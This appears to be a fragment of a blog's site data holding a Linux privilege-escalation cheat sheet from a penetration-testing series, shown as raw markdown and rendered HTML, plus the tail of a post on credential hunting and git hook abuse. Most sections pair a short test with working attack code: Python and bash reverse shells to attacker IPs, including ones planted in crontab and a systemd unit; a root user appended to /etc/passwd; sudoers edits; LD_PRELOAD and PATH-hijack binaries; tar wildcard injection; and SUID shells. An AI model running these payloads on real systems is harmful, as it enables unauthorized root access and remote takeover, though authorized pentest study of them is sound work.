class=\"built_in\">echo</span> <span class=\"string\">&quot;System users and last authentication date:&quot;</span>\n<span class=\"built_in\">echo</span> <span class=\"string\">&quot;-----------------------------------------------------&quot;</span>\n\n<span class=\"keyword\">while</span> IFS=: <span class=\"built_in\">read</span> -r user _ uid _ _ home shell; <span class=\"keyword\">do</span>\n    <span class=\"keyword\">if</span> [[ <span class=\"string\">&quot;<span class=\"variable\">$shell</span>&quot;</span> =~ sh$ ]]; <span class=\"keyword\">then</span>\n        last_logon=$(last -n 1 -R <span class=\"string\">&quot;<span class=\"variable\">$user</span>&quot;</span> | <span class=\"built_in\">head</span> -n 1 | awk <span class=\"string\">&#x27;&#123;print $4, $5, $6&#125;&#x27;</span>)\n        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;Username: <span class=\"variable\">$user</span>&quot;</span>\n        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;UID: <span class=\"variable\">$uid</span>&quot;</span>\n        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;Home dir: <span class=\"variable\">$home</span>&quot;</span>\n        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;Shell: <span class=\"variable\">$shell</span>&quot;</span>\n        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;Last login: <span class=\"variable\">$last_logon</span>&quot;</span>\n        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;-----------------------------------------------------&quot;</span>\n    <span class=\"keyword\">fi</span>\n<span class=\"keyword\">done</span> &lt; /etc/passwd</code></pre>\n\n<br>\n\n<h2 id=\"Credentials\"><a href=\"#Credentials\" class=\"headerlink\" title=\"Credentials\"></a>Credentials</h2><pre><div class=\"caption\"><span>Eviltree</span></div><code class=\"highlight bash\"><span class=\"comment\"># regex</span>\npython3 eviltree.py -r <span class=\"variable\">$dir</span> -x <span class=\"string\">&quot;.&#123;0,3&#125;passwd.&#123;0.3&#125;[=]&#123;1&#125;.&#123;0,18&#125;&quot;</span> -A -q -i -v\n<span class=\"comment\"># keywords</span>\npython3 eviltree.py -r <span class=\"variable\">$dir</span> -k passw,db_,admin,account,user,token -A -q -i -v</code></pre>\n<pre><div class=\"caption\"><span>Scavanger</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> python2 ~/tools/scavanger/scavenger.py smb -t <span class=\"variable\">$IP</span> -u <span class=\"variable\">$username</span> -p <span class=\"string\">&#x27;$pass&#x27;</span> -d <span class=\"variable\">$domain</span></code></pre>\n\n<br>\n\n<h2 id=\"Others\"><a href=\"#Others\" class=\"headerlink\" title=\"Others\"></a>Others</h2><p>Git commits</p>\n<pre><code class=\"highlight bash\">git <span class=\"built_in\">log</span>        <span class=\"comment\"># list commits</span>\ngit <span class=\"built_in\">log</span> -p     <span class=\"comment\"># the patch output</span>\ngit <span class=\"built_in\">log</span> -p -2  <span class=\"comment\"># last 2 entries</span>\ngit <span class=\"built_in\">log</span> --<span class=\"built_in\">stat</span> <span class=\"comment\"># view stats</span></code></pre>\n<p>Exploit git hooks</p>\n<pre><div class=\"caption\"><span>pre-commit hook</span></div><code class=\"highlight bash\"><span class=\"built_in\">echo</span> -e <span class=\"string\">&quot;#!/bin/sh\\nmalicious_command&quot;</span> &gt; .git/hooks/pre-commit\n<span class=\"built_in\">chmod</span> +x .git/hooks/pre-commit</code></pre>\n<pre><div class=\"caption\"><span>post-checkout hook</span></div><code class=\"highlight bash\"><span class=\"built_in\">echo</span> -e <span class=\"string\">&quot;#!/bin/sh\\nmalicious_command&quot;</span> &gt; .git/hooks/post-checkout\n<span class=\"built_in\">chmod</span> +x .git/hooks/post-checkout\n</code></pre>\n\n<br>\n\n<hr>\n<hr>"},{"title":"6. Privilege escalation - Linux","date":"2024-08-02T11:00:00.000Z","toc":true,"_content":"\n---\nStep 6 in a penetration test: Privilege escalation.\nUpgrade permissions, gain access to more resources, become `root`. \n\n---\n<!-- more -->\n\n<br>\n\n## Reverse shell from privileged python script\n```python\nIP=\"10.10.14.10\"\nPORT=4444\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((IP,PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")\n```\n\n<br>\n\n## Files with SUID and SGID bit\n> SUID (set user ID) and GUID (set group ID) bits are flags set on Linux ELF executables, allowing any user to run them as the owner (impersonate the owner).\n\n**Test**\n```bash\n# suid\nfind / -perm -u=s -type f 2>/dev/null\n# sgid\nfind / -perm -u=g -type f 2>/dev/null\n# both\nfind / -type f \\( -perm -4000 -o -perm -2000 \\) -exec ls -l {} \\; 2>/dev/null\n```\nExecutables you should look for:\n```bash\n/usr/bin/passwd\n/usr/bin/sudo\n/bin/su\n/usr/bin/chsh\n/usr/bin/chfn\n/bin/mount\n/bin/umount\n/usr/bin/locate\n/usr/bin/at\n```\n```bash\n/usr/bin/newgrp\n/usr/bin/execute\n/usr/bin/gpasswd\n```\n\n**Exploit**\nExample with `doas` executable\n```bash\ndoas -u root /bin/bash\n```\n\n<br>\n\n## Edit `/etc/passwd`\n> `/etc/passwd` file contains info about user accounts on the machine. Adding an entry (a line) to this file allows us to create a custom user with predefined UID and GID.\n\n**Test**\n```bash\n\n```\n\n**Exploit**\nCreate a user `chronos` with password `chronos`. User and group ID are `0`.\n```bash\necho 'chronos:$1$d7venmwO$dSO1eZg6GvVd/ihQLdb6K/:0:0::/root:/bin/bash' >> /etc/passwd\n```\n\n<br>\n\n## Append user to sudoers\n> `/etc/sudoers` file defines the users who can run commands as `root`. If we can modify it, we can give our current user privileged permissions.\n\n**Test**\n```bash\nsudo visudo -f /etc/sudoers\n```\n\n**Exploit**\nAdd user to `/etc/sudoers`\n```bash\necho 'username        ALL=(ALL)        NOPASSWD: ALL' >> /etc/sudoers\n```\nPossibilities:\n```bash all commands\nchronos ALL=(ALL:ALL) ALL\nchronos ALL=(root) NOPASSWD: ALL\n```\n```bash specific command only\nchronos ALL=(root) NOPASSWD: /usr/bin/command\n```\n\n<br>\n\n## SUDO permissions with preserved environment\n> You need to set the PATH variable when running the command\n\n**Test**\n```bash\nsudo -l\n```\n```plain\n(root) SETENV: NOPASSWD: command\n```\n\n**Exploit**\nCreate a custom script named after the `nopasswd` command\n```\necho '/bin/bash -p' > /tmp/command\nchmod +x /tmp/command\n```\nRun it\n```bash\nsudo PATH=/tmp:$PATH command\n```\n\n<br>\n\n## Relative PATH - call to an executable\n> A relative PATH vulnerability occurs when a script or binary calls another executable (like service) without specifying its full path. This allows attackers to create a malicious executable with the same name and manipulate the PATH variable to escalate privileges, especially if the vulnerable script is SUID.\n\n**Test**\n> Look for scripts/binaries calling executables without full paths\n> Imagine `/home/user/vulnerable` calls the `service` binary without specifying the full path\n```bash\nstrings /home/user/vulnerable\n```\n\n**Exploit**\nCreate a custom executable\n```bash /tmp/service\necho 'int main() { setgid(0); setuid(0); system(\"/bin/bash\"); return 0; }' > /tmp/service.c\ngcc /tmp/service.c -o /tmp/service\n```\nManipulate the `PATH` and execute the vulnerable script/binary\n```bash\nexport PATH=/tmp:$PATH # because our script called service is found in /tmp\n/home/user/vulnerable\n```\n\n<br>\n\n## Relative PATH - call to a shell function\n> This exploit leverages the ability to override a system command with a shell function. When a script or binary calls a command without specifying its full path, you can define a function with the same name to execute malicious code instead. If combined with a SUID binary, this can lead to privilege escalation.\n\n**Test**\n> Look for scripts/binaries calling executables without full paths\n> Imagine `/home/user/vulnerable` calls the `service` binary without specifying the full path\n```bash\nstrings /home/user/vulnerable\n```\n\n**Exploit**\nCreate a malicious function\n```bash\nfunction /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }\n```\nExport the function\n```bash\nexport -f /usr/sbin/service\n```\nRun the script/binary that calls the service\n```bash\n/home/user/vulnerable\n```\n\n<br>\n\n## LD_PRELOAD SUID\n> LD_PRELOAD is an environment variable used in Unix-like operating systems that allows you to specify additional shared libraries to be loaded before others. This can override existing functions in the target programs shared libraries.\n\n**Test**\n```bash\nsudo -l\n```\n```plain\nMatching Defaults entries for user on this host:\n    env_reset, env_keep+=LD_PRELOAD\n```\n\n**Exploit**\n```bash  \nenv # look for LD_PRELOAD\n```\n```c /tmp/malicious.c - create a library that overrides the standard one\n#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\n\nvoid _init() {\n    unsetenv(\"LD_PRELOAD\");\n    setgid(0);\n    setuid(0);\n    system(\"/bin/bash\");\n}\n```\n```bash compile the shared library\ngcc -fPIC -shared -o /tmp/malicious.so /tmp/malicious.c -nostartfiles\n```\n```bash set the new library\nexport LD_PRELOAD=/tmp/malicious.so\nprintenv LD_PRELOAD\n```\n```bash run a program such as apache\nsudo LD_PRELOAD=/tmp/malicious.so apache2\n```\n\n<br>\n\n## Writable crontab\n> Define commands that should be executed on the system at regular intervals\n\n**Test**\n```bash\n(crontab -l; echo \"* * * * * /bin/echo 'Crontab is writable' > /tmp/crontab_test\") | crontab -\n```\n\n**Exploit**\nExtract attacker IP\n```bash\nip a s\n```\nAdd line to crontab (open `nano` editor)\n```bash\ncrontab -e\n```\n```bash crontab command\n* * * * * python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.10\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'\n```\n\n<br>\n\n## Symbolic link (symlinks)\n> An attacker can create a symbolic link pointing to a sensitive or writable file (e.g., a file with elevated privileges). If a privileged process or script follows this symlink and modifies the target file, it can lead to unauthorized actions.\n> 1. Find a writable directory that is accessible to a user who can exploit it.\n2. Identify a script or process running as a privileged user that might follow symbolic links.\n3. Create a symbolic link in that writable directory pointing to a sensitive or critical file that the privileged process might interact with.\n\n**Test**\n```bash Find writable directories\nfind / -type d -writable 2>/dev/null\n```\n```bash List processes with elevated privileges (e.g., cron jobs)\nps aux | grep -E '(crond|atd|systemd|root)'\n```\n\n**Exploit**\n```bash Create a symlink in a writable directory\ncd /tmp\nln -s /etc/passwd /tmp/my_symlink\n```\n```bash Trigger the privileged process\ntouch /tmp/my_symlink\n```\n```bash Verify exploitation\nls -l /etc/passwd\n```\n\n<br>\n\n## Import modified `python` module\n> Python scripts running with elevated privileges can be exploited if they import modules from directories writable by untrusted users. An attacker can place a malicious library in such a directory to execute arbitrary code with elevated privileges.\n> - **Identify the target script**: Find a script running as a privileged user that imports modules.\n> - **Writable directory**: Determine if the script imports from a directory writable by non-privileged users.\n> - **Create a malicious module**: Place a malicious module in the writable directory.\n> - **Exploit**: When the script imports the malicious module, it executes the attacker's code with elevated privileges.\n\n**Test**\nExample: `/priv/vuln.py` imports a custom module from writable directory `/home/user`\n```python /priv/vuln.py\nimport some_module\n...\n```\n```bash Module search path for this script\npython3 -c \"import sys; print(sys.path)\"\n```\n```bash Example outputs\n['', '/usr/lib/python3.8', '/usr/lib/python3.8/plat-x86_64-linux-gnu', '/usr/lib/python3.8/lib-dynload', '/home/user/.local/lib/python3.8/site-packages', '/usr/local/lib/python3.8/dist-packages', '/home/user']\n```\nIf one of those is `/home/user` (the writable directory), we can exploit the vulnerable script.\n\n**Exploit**\n```bash Create a malicious module\necho \"import os; os.system('/bin/bash')\" > /home/user/some_module.py\n```\n```bash Run the privileged script with updated module\nsudo python3 /priv/vuln.py\n```\n\n\n<br>\n\n## NFS `no_root_squash` / `no_all_squash`\n> `no_root_squash`: Allows root user on NFS client to retain root privileges on the NFS server.\n`no_all_squash`: Prevents mapping of all users to anonymous user (nobody), keeping their original privileges.\n\n**Test**\n```bash command\ncat /etc/exports\n```\n```plain example output\n/home/chronos *(rw,fsid=0,sync,no_root_squash,insecure)\n```\n\n**Exploit** - 1. attacker machine\n```bash mount the NFS share\nmkdir /mnt/nfs\nmount -t nfs $IP:/path/to/share /mnt/nfs\n```\n```bash create a root-owned file and a SUID shell\ntouch /mnt/nfs/root_owned_file\necho '#!/bin/bash' > /mnt/nfs/suid_shell\necho 'chmod +s /bin/bash' >> /mnt/nfs/suid_shell\nchmod +x /mnt/nfs/suid_shell\n```\n**Exploit** - 2. victim machine\n```bash execute the payload\n/mnt/nfs/suid_shell\n/bin/bash -p\n```\n\n<br>\n\n## Linux capabilities\n> Linux capabilities allow programs to perform privileged operations without granting full root permissions. When a binary has capabilities like cap_setuid, it can be exploited to gain root privileges. \nThis applies to any binary, but we'll use `python` as an example.\n\n**Test**\n```bash list capabilities of binaries on the system\ngetcap -r / 2>/dev/null\n```\n```plain example output\n/usr/bin/python2.6 = cap_setuid+ep\n```\n\n**Exploit**\n```bash change its user ID to root\n/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\n```\n\nCommon binaries wih capabilities\n```bash\npython3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\n```\n```bash\nperl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";'\n```\n```bash\nruby -e 'exec \"/bin/bash\"'\n```\n```bash\ngdb -nx -ex '!sh' -ex quit\n```\n```bash\ncpython -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\n```\n```bash\ntar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash\n```\n\n<br>\n\n## `tar` wildcard (with cron job)\n> **Wildcards in tar**: When `tar` encounters filenames starting with `--`, it treats them as command-line options. This can be exploited to inject tar options like `--checkpoint` and `--checkpoint-action`, which can execute arbitrary commands.\n**Cron Job**: The cron job running the vulnerable script executes the `tar` command periodically, triggering the exploit when the special files are present.\n\n**Test**\nIdentify the vulnerability\n```bash example script\ncat /home/user/compress.sh\n```\n```bash compress.sh\n#!/bin/sh\ncd /home/user\ntar czf /tmp/backup.tar.gz *\n```\nCron job\n```bash list cron jobs\ncrontab -l\n```\n```bash cron job line\n* * * * * /usr/local/bin/compress.sh\n```\n\n**Exploit**\nCreate files with names that `tar` will interpret as options\n```bash\n# Create a payload script\necho 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh\n\n# Create special files to inject `tar` options\ntouch /home/user/--checkpoint=1\ntouch /home/user/--checkpoint-action=exec=sh\\ runme.sh\n```\n\nWait for the cron job to execute\n```bash\nsleep 60\n/tmp/bash -p\n```\n\n<br>\n\n## Restart service\n> Locate the config file for the respective service and replace _action on reload_ with a reverse shell\n\n**Test**\n```bash\nsudo -l\n```\n```plain\n(ALL : ALL) /usr/sbin/service vsftpd restart\n```\n\n**Exploit**\nView the config file for the service (`vsftpd` in this example)\n```bash\nlocate vsftpd.service\n```\n```plain\n/etc/systemd/system/multi-user.target.wants/vsftpd.service\n```\nAdd the attacker IP in the modified service config (reverse shell).\n<div style=\"display: flex; justify-content: space-between;\">\n  <div style=\"flex: 1; padding: 2px; min-width: 300px;\">\n    <p>Default service configuration</p>\n    <pre style=\"overflow-x: auto; white-space: nowrap;\">\n    ```conf\n    [Unit]\n    Description=vsftpd FTP server\n    After=network.target\n\n    [Service]\n    Type=simple\n    ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf\n    ExecReload=/bin/kill -HUP $MAINPID\n    ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty\n\n    [Install]\n    WantedBy=multi-user.target\n    ```\n    </pre>\n  </div>\n  <div style=\"flex: 1; padding: 2px; min-width: 300px;\">\n    <p>Modified service configuration</p>\n    <pre style=\"overflow-x: auto; white-space: nowrap;\">\n    ```conf\n    [Unit]\n    Description=vsftpd FTP server\n    After=network.target\n\n    [Service]\n    User=root\n    Type=simple\n    ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/443 0>&1'\n\n\n    [Install]\n    WantedBy=multi-user.target\n    ```\n    </pre>\n  </div>\n</div>\n\n<br>\n\n## Shell in input prompt\n**Test**\n```bash script.sh\n#!/bin/bash\nread -p \"What's you name: \"\n```\n\n**Exploit**\n```bash payload\n/bin/bash -i\n```\n\n<br>\n\n---\n---\n","source":"_posts/Pentesting/Linux/6.md","raw":"---\ntitle: 6. Privilege escalation - Linux\ndate: 2024-08-02 14:00:00\ncategories:\n  - Pentesting\n  - Linux\ntags:\n  - Pentesting\n  - Linux\n  - Privesc\ntoc: true\n---\n\n---\nStep 6 in a penetration test: Privilege escalation.\nUpgrade permissions, gain access to more resources, become `root`. \n\n---\n<!-- more -->\n\n<br>\n\n## Reverse shell from privileged python script\n```python\nIP=\"10.10.14.10\"\nPORT=4444\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((IP,PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")\n```\n\n<br>\n\n## Files with SUID and SGID bit\n> SUID (set user ID) and GUID (set group ID) bits are flags set on Linux ELF executables, allowing any user to run them as the owner (impersonate the owner).\n\n**Test**\n```bash\n# suid\nfind / -perm -u=s -type f 2>/dev/null\n# sgid\nfind / -perm -u=g -type f 2>/dev/null\n# both\nfind / -type f \\( -perm -4000 -o -perm -2000 \\) -exec ls -l {} \\; 2>/dev/null\n```\nExecutables you should look for:\n```bash\n/usr/bin/passwd\n/usr/bin/sudo\n/bin/su\n/usr/bin/chsh\n/usr/bin/chfn\n/bin/mount\n/bin/umount\n/usr/bin/locate\n/usr/bin/at\n```\n```bash\n/usr/bin/newgrp\n/usr/bin/execute\n/usr/bin/gpasswd\n```\n\n**Exploit**\nExample with `doas` executable\n```bash\ndoas -u root /bin/bash\n```\n\n<br>\n\n## Edit `/etc/passwd`\n> `/etc/passwd` file contains info about user accounts on the machine. Adding an entry (a line) to this file allows us to create a custom user with predefined UID and GID.\n\n**Test**\n```bash\n\n```\n\n**Exploit**\nCreate a user `chronos` with password `chronos`. User and group ID are `0`.\n```bash\necho 'chronos:$1$d7venmwO$dSO1eZg6GvVd/ihQLdb6K/:0:0::/root:/bin/bash' >> /etc/passwd\n```\n\n<br>\n\n## Append user to sudoers\n> `/etc/sudoers` file defines the users who can run commands as `root`. If we can modify it, we can give our current user privileged permissions.\n\n**Test**\n```bash\nsudo visudo -f /etc/sudoers\n```\n\n**Exploit**\nAdd user to `/etc/sudoers`\n```bash\necho 'username        ALL=(ALL)        NOPASSWD: ALL' >> /etc/sudoers\n```\nPossibilities:\n```bash all commands\nchronos ALL=(ALL:ALL) ALL\nchronos ALL=(root) NOPASSWD: ALL\n```\n```bash specific command only\nchronos ALL=(root) NOPASSWD: /usr/bin/command\n```\n\n<br>\n\n## SUDO permissions with preserved environment\n> You need to set the PATH variable when running the command\n\n**Test**\n```bash\nsudo -l\n```\n```plain\n(root) SETENV: NOPASSWD: command\n```\n\n**Exploit**\nCreate a custom script named after the `nopasswd` command\n```\necho '/bin/bash -p' > /tmp/command\nchmod +x /tmp/command\n```\nRun it\n```bash\nsudo PATH=/tmp:$PATH command\n```\n\n<br>\n\n## Relative PATH - call to an executable\n> A relative PATH vulnerability occurs when a script or binary calls another executable (like service) without specifying its full path. This allows attackers to create a malicious executable with the same name and manipulate the PATH variable to escalate privileges, especially if the vulnerable script is SUID.\n\n**Test**\n> Look for scripts/binaries calling executables without full paths\n> Imagine `/home/user/vulnerable` calls the `service` binary without specifying the full path\n```bash\nstrings /home/user/vulnerable\n```\n\n**Exploit**\nCreate a custom executable\n```bash /tmp/service\necho 'int main() { setgid(0); setuid(0); system(\"/bin/bash\"); return 0; }' > /tmp/service.c\ngcc /tmp/service.c -o /tmp/service\n```\nManipulate the `PATH` and execute the vulnerable script/binary\n```bash\nexport PATH=/tmp:$PATH # because our script called service is found in /tmp\n/home/user/vulnerable\n```\n\n<br>\n\n## Relative PATH - call to a shell function\n> This exploit leverages the ability to override a system command with a shell function. When a script or binary calls a command without specifying its full path, you can define a function with the same name to execute malicious code instead. If combined with a SUID binary, this can lead to privilege escalation.\n\n**Test**\n> Look for scripts/binaries calling executables without full paths\n> Imagine `/home/user/vulnerable` calls the `service` binary without specifying the full path\n```bash\nstrings /home/user/vulnerable\n```\n\n**Exploit**\nCreate a malicious function\n```bash\nfunction /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }\n```\nExport the function\n```bash\nexport -f /usr/sbin/service\n```\nRun the script/binary that calls the service\n```bash\n/home/user/vulnerable\n```\n\n<br>\n\n## LD_PRELOAD SUID\n> LD_PRELOAD is an environment variable used in Unix-like operating systems that allows you to specify additional shared libraries to be loaded before others. This can override existing functions in the target programs shared libraries.\n\n**Test**\n```bash\nsudo -l\n```\n```plain\nMatching Defaults entries for user on this host:\n    env_reset, env_keep+=LD_PRELOAD\n```\n\n**Exploit**\n```bash  \nenv # look for LD_PRELOAD\n```\n```c /tmp/malicious.c - create a library that overrides the standard one\n#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\n\nvoid _init() {\n    unsetenv(\"LD_PRELOAD\");\n    setgid(0);\n    setuid(0);\n    system(\"/bin/bash\");\n}\n```\n```bash compile the shared library\ngcc -fPIC -shared -o /tmp/malicious.so /tmp/malicious.c -nostartfiles\n```\n```bash set the new library\nexport LD_PRELOAD=/tmp/malicious.so\nprintenv LD_PRELOAD\n```\n```bash run a program such as apache\nsudo LD_PRELOAD=/tmp/malicious.so apache2\n```\n\n<br>\n\n## Writable crontab\n> Define commands that should be executed on the system at regular intervals\n\n**Test**\n```bash\n(crontab -l; echo \"* * * * * /bin/echo 'Crontab is writable' > /tmp/crontab_test\") | crontab -\n```\n\n**Exploit**\nExtract attacker IP\n```bash\nip a s\n```\nAdd line to crontab (open `nano` editor)\n```bash\ncrontab -e\n```\n```bash crontab command\n* * * * * python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.10\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'\n```\n\n<br>\n\n## Symbolic link (symlinks)\n> An attacker can create a symbolic link pointing to a sensitive or writable file (e.g., a file with elevated privileges). If a privileged process or script follows this symlink and modifies the target file, it can lead to unauthorized actions.\n> 1. Find a writable directory that is accessible to a user who can exploit it.\n2. Identify a script or process running as a privileged user that might follow symbolic links.\n3. Create a symbolic link in that writable directory pointing to a sensitive or critical file that the privileged process might interact with.\n\n**Test**\n```bash Find writable directories\nfind / -type d -writable 2>/dev/null\n```\n```bash List processes with elevated privileges (e.g., cron jobs)\nps aux | grep -E '(crond|atd|systemd|root)'\n```\n\n**Exploit**\n```bash Create a symlink in a writable directory\ncd /tmp\nln -s /etc/passwd /tmp/my_symlink\n```\n```bash Trigger the privileged process\ntouch /tmp/my_symlink\n```\n```bash Verify exploitation\nls -l /etc/passwd\n```\n\n<br>\n\n## Import modified `python` module\n> Python scripts running with elevated privileges can be exploited if they import modules from directories writable by untrusted users. An attacker can place a malicious library in such a directory to execute arbitrary code with elevated privileges.\n> - **Identify the target script**: Find a script running as a privileged user that imports modules.\n> - **Writable directory**: Determine if the script imports from a directory writable by non-privileged users.\n> - **Create a malicious module**: Place a malicious module in the writable directory.\n> - **Exploit**: When the script imports the malicious module, it executes the attacker's code with elevated privileges.\n\n**Test**\nExample: `/priv/vuln.py` imports a custom module from writable directory `/home/user`\n```python /priv/vuln.py\nimport some_module\n...\n```\n```bash Module search path for this script\npython3 -c \"import sys; print(sys.path)\"\n```\n```bash Example outputs\n['', '/usr/lib/python3.8', '/usr/lib/python3.8/plat-x86_64-linux-gnu', '/usr/lib/python3.8/lib-dynload', '/home/user/.local/lib/python3.8/site-packages', '/usr/local/lib/python3.8/dist-packages', '/home/user']\n```\nIf one of those is `/home/user` (the writable directory), we can exploit the vulnerable script.\n\n**Exploit**\n```bash Create a malicious module\necho \"import os; os.system('/bin/bash')\" > /home/user/some_module.py\n```\n```bash Run the privileged script with updated module\nsudo python3 /priv/vuln.py\n```\n\n\n<br>\n\n## NFS `no_root_squash` / `no_all_squash`\n> `no_root_squash`: Allows root user on NFS client to retain root privileges on the NFS server.\n`no_all_squash`: Prevents mapping of all users to anonymous user (nobody), keeping their original privileges.\n\n**Test**\n```bash command\ncat /etc/exports\n```\n```plain example output\n/home/chronos *(rw,fsid=0,sync,no_root_squash,insecure)\n```\n\n**Exploit** - 1. attacker machine\n```bash mount the NFS share\nmkdir /mnt/nfs\nmount -t nfs $IP:/path/to/share /mnt/nfs\n```\n```bash create a root-owned file and a SUID shell\ntouch /mnt/nfs/root_owned_file\necho '#!/bin/bash' > /mnt/nfs/suid_shell\necho 'chmod +s /bin/bash' >> /mnt/nfs/suid_shell\nchmod +x /mnt/nfs/suid_shell\n```\n**Exploit** - 2. victim machine\n```bash execute the payload\n/mnt/nfs/suid_shell\n/bin/bash -p\n```\n\n<br>\n\n## Linux capabilities\n> Linux capabilities allow programs to perform privileged operations without granting full root permissions. When a binary has capabilities like cap_setuid, it can be exploited to gain root privileges. \nThis applies to any binary, but we'll use `python` as an example.\n\n**Test**\n```bash list capabilities of binaries on the system\ngetcap -r / 2>/dev/null\n```\n```plain example output\n/usr/bin/python2.6 = cap_setuid+ep\n```\n\n**Exploit**\n```bash change its user ID to root\n/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\n```\n\nCommon binaries wih capabilities\n```bash\npython3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\n```\n```bash\nperl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";'\n```\n```bash\nruby -e 'exec \"/bin/bash\"'\n```\n```bash\ngdb -nx -ex '!sh' -ex quit\n```\n```bash\ncpython -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\n```\n```bash\ntar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash\n```\n\n<br>\n\n## `tar` wildcard (with cron job)\n> **Wildcards in tar**: When `tar` encounters filenames starting with `--`, it treats them as command-line options. This can be exploited to inject tar options like `--checkpoint` and `--checkpoint-action`, which can execute arbitrary commands.\n**Cron Job**: The cron job running the vulnerable script executes the `tar` command periodically, triggering the exploit when the special files are present.\n\n**Test**\nIdentify the vulnerability\n```bash example script\ncat /home/user/compress.sh\n```\n```bash compress.sh\n#!/bin/sh\ncd /home/user\ntar czf /tmp/backup.tar.gz *\n```\nCron job\n```bash list cron jobs\ncrontab -l\n```\n```bash cron job line\n* * * * * /usr/local/bin/compress.sh\n```\n\n**Exploit**\nCreate files with names that `tar` will interpret as options\n```bash\n# Create a payload script\necho 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh\n\n# Create special files to inject `tar` options\ntouch /home/user/--checkpoint=1\ntouch /home/user/--checkpoint-action=exec=sh\\ runme.sh\n```\n\nWait for the cron job to execute\n```bash\nsleep 60\n/tmp/bash -p\n```\n\n<br>\n\n## Restart service\n> Locate the config file for the respective service and replace _action on reload_ with a reverse shell\n\n**Test**\n```bash\nsudo -l\n```\n```plain\n(ALL : ALL) /usr/sbin/service vsftpd restart\n```\n\n**Exploit**\nView the config file for the service (`vsftpd` in this example)\n```bash\nlocate vsftpd.service\n```\n```plain\n/etc/systemd/system/multi-user.target.wants/vsftpd.service\n```\nAdd the attacker IP in the modified service config (reverse shell).\n<div style=\"display: flex; justify-content: space-between;\">\n  <div style=\"flex: 1; padding: 2px; min-width: 300px;\">\n    <p>Default service configuration</p>\n    <pre style=\"overflow-x: auto; white-space: nowrap;\">\n    ```conf\n    [Unit]\n    Description=vsftpd FTP server\n    After=network.target\n\n    [Service]\n    Type=simple\n    ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf\n    ExecReload=/bin/kill -HUP $MAINPID\n    ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty\n\n    [Install]\n    WantedBy=multi-user.target\n    ```\n    </pre>\n  </div>\n  <div style=\"flex: 1; padding: 2px; min-width: 300px;\">\n    <p>Modified service configuration</p>\n    <pre style=\"overflow-x: auto; white-space: nowrap;\">\n    ```conf\n    [Unit]\n    Description=vsftpd FTP server\n    After=network.target\n\n    [Service]\n    User=root\n    Type=simple\n    ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/443 0>&1'\n\n\n    [Install]\n    WantedBy=multi-user.target\n    ```\n    </pre>\n  </div>\n</div>\n\n<br>\n\n## Shell in input prompt\n**Test**\n```bash script.sh\n#!/bin/bash\nread -p \"What's you name: \"\n```\n\n**Exploit**\n```bash payload\n/bin/bash -i\n```\n\n<br>\n\n---\n---\n","slug":"Pentesting/Linux/6","published":1,"updated":"2024-09-23T06:18:55.861Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmhj00096gvg87bd612h","content":"<hr>\n<p>Step 6 in a penetration test: Privilege escalation.<br>Upgrade permissions, gain access to more resources, become <code>root</code>. </p>\n<hr>\n<span id=\"more\"></span>\n\n<br>\n\n<h2 id=\"Reverse-shell-from-privileged-python-script\"><a href=\"#Reverse-shell-from-privileged-python-script\" class=\"headerlink\" title=\"Reverse shell from privileged python script\"></a>Reverse shell from privileged python script</h2><pre><code class=\"highlight python\">IP=<span class=\"string\">&quot;10.10.14.10&quot;</span>\nPORT=<span class=\"number\">4444</span>\n<span class=\"keyword\">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((IP,PORT));os.dup2(s.fileno(),<span class=\"number\">0</span>); os.dup2(s.fileno(),<span class=\"number\">1</span>);os.dup2(s.fileno(),<span class=\"number\">2</span>);<span class=\"keyword\">import</span> pty; pty.spawn(<span class=\"string\">&quot;sh&quot;</span>)</code></pre>\n\n<br>\n\n<h2 id=\"Files-with-SUID-and-SGID-bit\"><a href=\"#Files-with-SUID-and-SGID-bit\" class=\"headerlink\" 